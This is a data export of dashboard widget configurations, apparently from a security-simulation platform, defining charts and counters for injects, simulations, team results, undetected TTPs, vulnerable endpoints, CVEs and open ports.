e86964ea-4f78-4004-9ffc-513092ac8dcd	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 10, "start": null, "title": "Performance overview", "series": [{"name": "Performance overview", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["MANUAL"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 0}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.888376+00	2026-01-09 14:19:31.910826+00
62af31ee-cb06-4e1b-8403-c20afd95ec27	NUMBER	{"end": null, "start": null, "title": "Injects not success", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "inject_status", "mode": "or", "values": ["SUCCESS"], "operator": "not_eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 2}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.893851+00	2026-01-09 14:19:31.914031+00
4f9c4f83-3b63-4302-b4f7-6fa296e5c157	DONUT	{"end": null, "mode": "structural", "field": "inject_status", "limit": 10, "start": null, "title": "Injects status", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 5, "widget_layout_x": 0, "widget_layout_y": 12}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.896049+00	2026-01-09 14:19:31.916321+00
08f2248d-b45b-48c1-9695-962884cb772f	NUMBER	{"end": null, "start": null, "title": "Injects", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 0}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.898798+00	2026-01-09 14:19:31.918404+00
064e7185-c491-4396-9c61-faa38169227d	DONUT	{"end": null, "mode": "structural", "field": "base_team_side", "limit": 10, "start": null, "title": "TEAMS ENGAGED", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 0}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.902242+00	2026-01-09 14:19:31.920464+00
c8b2d471-98b7-4522-a39d-7530c7feec2f	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "inject_expectation_type", "limit": 10, "start": null, "title": "Injects Types", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 4, "widget_layout_y": 0}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.904097+00	2026-01-09 14:19:31.922799+00
c39082c8-d955-4d62-b531-252ae8542627	LINE	{"end": null, "mode": "temporal", "start": null, "title": "Injects over time", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 8, "widget_layout_w": 4, "widget_layout_x": 0, "widget_layout_y": 4}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.905866+00	2026-01-09 14:19:31.924782+00
8a9fd886-4362-4c68-8fab-a3685acb3a83	DONUT	{"end": null, "mode": "structural", "field": "vulnerable_endpoint_action", "limit": 100, "start": null, "title": "Recommended action", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 6, "widget_layout_y": 0}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.173987+00	2026-01-09 14:19:32.174003+00
7948135d-8f56-4f9f-b758-ba9b840aaa92	VERTICAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_team_side", "limit": 100, "start": null, "title": "Success/Fails by teams", "series": [{"name": "Failed", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DOCUMENT", "ARTICLE", "CHALLENGE", "MANUAL"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}, {"name": "Success", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["TEXT", "DOCUMENT", "ARTICLE", "CHALLENGE", "MANUAL"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 8, "widget_layout_x": 4, "widget_layout_y": 6}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.907264+00	2026-01-09 14:19:31.926401+00
905cc030-c76c-4d46-be2c-308c8ee3ead6	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Latest injects", "series": [], "columns": ["inject_expectation_type", "inject_expectation_status", "base_created_at", "inject_expectation_expected_score", "inject_expectation_score"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "base_simulation_side", "mode": "or", "values": ["44599471-8b0f-4e1a-8916-b766fb57b6a2", "315f703e-35db-4564-af22-08cfc29e7286"], "operator": "eq"}]}}, "date_attribute": "base_updated_at", "widget_configuration_type": "list"}	{"widget_layout_h": 6, "widget_layout_w": 7, "widget_layout_x": 5, "widget_layout_y": 12}	126a5c9a-1803-47f2-9f27-458d846ce6b4	2026-01-09 14:19:31.90901+00	2026-01-09 14:19:31.928801+00
a25033de-e4da-48a1-9bb0-c15ce0f00cbf	NUMBER	{"end": null, "start": null, "title": "Injects", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 2}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.981475+00	2026-01-09 14:19:31.997235+00
155052e7-bc19-46e7-8dbe-8ceafc45a8f1	DONUT	{"end": null, "mode": "structural", "field": "base_team_side", "limit": 10, "start": null, "title": "TEAMS ENGAGED", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 0}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.980218+00	2026-01-09 14:19:31.994256+00
60ec4819-2d17-41d0-a338-6e621cb166ea	LINE	{"end": null, "mode": "temporal", "start": null, "title": "Simulations over time", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 0, "widget_layout_y": 4}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.986672+00	2026-01-09 14:19:32.006189+00
e641b608-4e3b-45af-a607-732bad9234e2	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "inject_expectation_type", "limit": 10, "start": null, "title": "Injects Types", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 4, "widget_layout_y": 0}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.982779+00	2026-01-09 14:19:31.999244+00
548fb19d-5792-47eb-9fde-2ba1e573eee6	NUMBER	{"end": null, "start": null, "title": "Injects not success", "series": [{"name": "Injects failed", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "inject_status", "mode": "or", "values": ["SUCCESS"], "operator": "not_eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 10}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.984307+00	2026-01-09 14:19:32.001319+00
e7e023a8-00ff-4de9-b954-98bdefb4a15a	NUMBER	{"end": null, "start": null, "title": "Simulations Finished", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": [], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}, {"key": "status", "mode": "or", "values": ["FINISHED"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 10}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.985472+00	2026-01-09 14:19:32.003294+00
28ff9216-9b91-4bc4-9e5a-6c8e90f18650	DONUT	{"end": null, "mode": "structural", "field": "inject_status", "limit": 10, "start": null, "title": "Injects status", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["inject"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 5, "widget_layout_x": 0, "widget_layout_y": 12}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.987931+00	2026-01-09 14:19:32.008027+00
191a6f9b-5e2b-46da-aeca-15fbb87984d2	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Latest simulations", "series": [], "columns": ["name", "base_created_at", "status", "base_tags_side"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 6, "widget_layout_w": 7, "widget_layout_x": 5, "widget_layout_y": 12}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.9891+00	2026-01-09 14:19:32.011491+00
92b58a51-0683-4440-8b4f-43d22c2fe057	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 10, "start": null, "title": "Performance overview", "series": [{"name": "Performance overview", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["MANUAL"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 0, "widget_layout_y": 0}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.990348+00	2026-01-09 14:19:32.013921+00
c68eaa8b-d331-4e39-8171-72cf0a4c0df9	NUMBER	{"end": null, "start": null, "title": "Simulations", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 2, "widget_layout_y": 0}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.991762+00	2026-01-09 14:19:32.015741+00
d68b008b-2302-48ee-9caf-8895246d1f83	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Vulnerable endpoints", "series": [], "columns": ["vulnerable_endpoint_hostname", "base_created_at", "vulnerable_endpoint_agents_active_status", "vulnerable_endpoint_action", "vulnerable_endpoint_findings_summary"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 5, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 14}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.155286+00	2026-01-09 14:19:32.155301+00
281ff12c-ee0a-4e23-b5f9-03c69bd0ae35	LINE	{"end": null, "mode": "temporal", "start": null, "title": "Simulation by week", "series": [{"name": "Simulation", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 6, "widget_layout_x": 0, "widget_layout_y": 43}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.176436+00	2026-01-09 14:19:32.176458+00
a016e46d-e0fb-41fd-a90f-8b835cf96d08	VERTICAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_team_side", "limit": 100, "start": null, "title": "Success/Fails by teams", "series": [{"name": "Failed", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DOCUMENT", "ARTICLE", "CHALLENGE", "MANUAL"], "operator": "eq"}]}}, {"name": "Success", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["TEXT", "DOCUMENT", "ARTICLE", "CHALLENGE", "MANUAL"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "eq"}, {"key": "base_scenario_side", "mode": "or", "values": ["e91c3ca6-05db-43fe-b6e0-d45bc4feca7e", "6c9d8beb-57e1-4bb1-91e1-00554d81b5dc"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 8, "widget_layout_x": 4, "widget_layout_y": 6}	766b1ffb-d664-47bd-941d-38d35b1ea6fb	2026-01-09 14:19:31.992897+00	2026-01-09 14:19:32.017966+00
569f337a-9894-43e1-aada-b5c0500dbdfc	LIST	{"end": null, "limit": 100, "sorts": [{"direction": "DESC", "fieldName": "base_created_at"}], "start": null, "title": "Findings", "series": [], "columns": ["finding_value", "base_created_at", "finding_type"], "time_range": "DEFAULT", "perspective": {"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}]}}, "date_attribute": "base_created_at", "widget_configuration_type": "list"}	{"widget_layout_h": 10, "widget_layout_w": 8, "widget_layout_x": 0, "widget_layout_y": 4}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.140807+00	2026-01-09 14:19:32.140825+00
d7da040d-8a9f-41d6-818c-547e8c13fea9	DONUT	{"end": null, "mode": "structural", "field": "inject_expectation_status", "limit": 100, "start": null, "title": "Vulnerability", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["VULNERABILITY"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 4, "widget_layout_w": 2, "widget_layout_x": 4, "widget_layout_y": 0}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.14283+00	2026-01-09 14:19:32.142848+00
a4411f03-ab9b-4d78-a6fc-7c12e4c6764c	NUMBER	{"end": null, "start": null, "title": "endpoints", "series": [{"name": "endpoints", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["endpoint"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 4}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.1459+00	2026-01-09 14:19:32.145917+00
5de587e9-77a1-4a60-b5e5-217e2cb6329f	NUMBER	{"end": null, "start": null, "title": "Simulation", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["simulation"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 0}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.147666+00	2026-01-09 14:19:32.147682+00
0da51548-a122-45ca-883c-b7b9bd0eeb52	VERTICAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_security_platforms_side", "limit": 100, "start": null, "title": "Inject undetected by security platform", "series": [{"name": "Not Detected", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}]}}, {"name": "Not Prevented", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 8, "widget_layout_w": 12, "widget_layout_x": 0, "widget_layout_y": 35}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.149281+00	2026-01-09 14:19:32.14931+00
aa0dbf07-b0d7-4ddf-8de3-c2099bffba0f	NUMBER	{"end": null, "start": null, "title": "Ports Open", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "finding_type", "mode": "or", "values": ["PortsScan", "Port"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 6}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.15101+00	2026-01-09 14:19:32.151026+00
79f4437b-c5c5-4689-89cd-7bd8077778a6	NUMBER	{"end": null, "start": null, "title": "VULNERABLE ENDPOINTS NUMBER", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["vulnerable-endpoint"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 2}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.153413+00	2026-01-09 14:19:32.153429+00
3970b136-dc9a-419a-85b5-a88af0a5212d	NUMBER	{"end": null, "start": null, "title": "CVEs found", "series": [{"name": "", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}, {"key": "finding_type", "mode": "or", "values": ["CVE"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 10, "widget_layout_y": 4}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.172596+00	2026-01-09 14:19:32.172611+00
65fe33c8-77fb-42ab-b81f-3d997e093052	VERTICAL_BAR_CHART	{"end": null, "mode": "temporal", "start": null, "title": "Inject undetectected/unprevented by week", "series": [{"name": "Not Detected", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "not_eq"}]}}, {"name": "Not Prevented", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["SUCCESS"], "operator": "not_eq"}]}}], "stacked": false, "interval": "week", "time_range": "DEFAULT", "date_attribute": "base_updated_at", "display_legend": false, "widget_configuration_type": "temporal-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 0, "widget_layout_y": 19}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.156972+00	2026-01-09 14:19:32.156988+00
b8b76d5e-6bd9-4bbd-ad94-687d25aa917d	HORIZONTAL_BAR_CHART	{"end": null, "mode": "structural", "field": "base_attack_patterns_side", "limit": 10, "start": null, "title": "Most undetected TTPs", "series": [{"name": "Undetected TTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["DETECTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}]}}, {"name": "UnpreventedTTPs", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["expectation-inject"], "operator": "eq"}, {"key": "inject_expectation_type", "mode": "or", "values": ["PREVENTION"], "operator": "eq"}, {"key": "inject_expectation_status", "mode": "or", "values": ["FAILED"], "operator": "eq"}]}}], "stacked": false, "time_range": "DEFAULT", "date_attribute": "base_created_at", "display_legend": false, "widget_configuration_type": "structural-histogram"}	{"widget_layout_h": 6, "widget_layout_w": 4, "widget_layout_x": 8, "widget_layout_y": 19}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.158509+00	2026-01-09 14:19:32.158524+00
e4f9eb90-3efe-4351-8128-9f2a3afcd4f9	NUMBER	{"end": null, "start": null, "title": "Total number of findings", "series": [{"name": "findings", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["finding"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 6}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.161581+00	2026-01-09 14:19:32.161597+00
68f7706f-bfff-4a44-a54f-7137e1a5b35e	NUMBER	{"end": null, "start": null, "title": "Scenario", "series": [{"name": "Scenario", "filter": {"mode": "and", "filters": [{"key": "base_entity", "mode": "or", "values": ["scenario"], "operator": "eq"}]}}], "time_range": "DEFAULT", "date_attribute": "base_created_at", "widget_configuration_type": "flat"}	{"widget_layout_h": 2, "widget_layout_w": 2, "widget_layout_x": 8, "widget_layout_y": 0}	d02a5fec-41fc-416b-9e8f-8c89a89fa829	2026-01-09 14:19:32.163228+00	2026-01-09 14:19:32.163243+00
